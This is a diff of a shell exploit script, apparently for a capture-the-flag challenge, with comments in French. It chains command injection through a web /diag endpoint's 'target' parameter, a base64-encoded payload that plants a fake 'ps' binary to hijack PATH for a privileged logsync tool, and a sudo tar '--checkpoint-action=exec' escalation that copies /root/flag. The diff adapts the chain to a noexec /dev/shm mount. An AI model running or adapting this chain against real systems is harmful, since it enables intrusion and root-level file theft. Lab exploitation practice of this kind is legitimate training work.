@@ -22,17 +22,19 @@ read -r -d '' APP_PS <<'EOF' || true
 cd /home/app 2>/dev/null || cd /tmp
 sudo -n /usr/bin/tar -czf /var/backups/app-logs.tgz /etc/hostname \
   --checkpoint=1 \
-  --checkpoint-action=exec='cp /root/flag /dev/shm/loot; chmod 644 /dev/shm/loot' \
+  --checkpoint-action=exec='cp /root/flag /tmp/.logsync/loot; chmod 644 /tmp/.logsync/loot' \
   >/dev/null 2>&1
 EOF
 
 # --- www-side payload: plant the hijack `ps`, trigger logsync, read the loot. -
 APP_PS_B64="$(printf '%s' "$APP_PS" | base64 | tr -d '\n')"
 read -r -d '' WWW <<EOF || true
-rm -f /dev/shm/loot
-echo $APP_PS_B64 | base64 -d > /dev/shm/ps
-chmod +x /dev/shm/ps
-PATH=/dev/shm:\$PATH /usr/local/bin/logsync >/dev/null 2>&1
+# /dev/shm est monte noexec dans l'arene ; on plante la charge dans /tmp (exec).
+mkdir -p /tmp/.logsync && chmod 755 /tmp/.logsync
+rm -f /tmp/.logsync/loot
+echo $APP_PS_B64 | base64 -d > /tmp/.logsync/ps
+chmod 755 /tmp/.logsync/ps
+PATH=/tmp/.logsync:\$PATH /usr/local/bin/logsync >/dev/null 2>&1
 EOF
 
 WWW_B64="$(printf '%s' "$WWW" | base64 | tr -d '\n')"
@@ -41,18 +43,18 @@ WWW_B64="$(printf '%s' "$WWW" | base64 | tr -d '\n')"
 # checkpoint) est DÉTACHÉE (`... | sh &`) : /diag a un timeout de requête, et si
 # la chaîne tourne dans la requête elle se fait tuer avant d'écrire le loot. En
 # la détachant, /diag répond tout de suite et la chaîne se termine en fond.
-INJECT="x; echo ${WWW_B64} | base64 -d | sh &"
+INJECT="localhost; ( echo ${WWW_B64} | base64 -d | /bin/sh ) >/dev/null 2>&1 </dev/null &"
 
 echo "[*] firing chain through /diag (detached) ..." >&2
 curl -s -m 15 -G "$BASE/diag" --data-urlencode "target=${INJECT}" >/dev/null || true
 
 # La chaîne s'exécute en fond ; on relit le loot plusieurs fois le temps que
 # tar->checkpoint->cp aboutisse (démarrage à froid du conteneur inclus).
-echo "[*] reading /dev/shm/loot ..." >&2
+echo "[*] reading /tmp/.logsync/loot ..." >&2
 FLAG=""
 for i in 1 2 3 4 5 6; do
     sleep 2
-    OUT="$(curl -s -m 15 -G "$BASE/diag" --data-urlencode 'target=x; cat /dev/shm/loot 2>/dev/null' || true)"
+    OUT="$(curl -s -m 15 -G "$BASE/diag" --data-urlencode 'target=localhost; cat /tmp/.logsync/loot 2>/dev/null' || true)"
     FLAG="$(printf '%s' "$OUT" | grep -oE 'NCTF\{[^}]*\}' | head -n1 || true)"
     [ -n "$FLAG" ] && break
 done
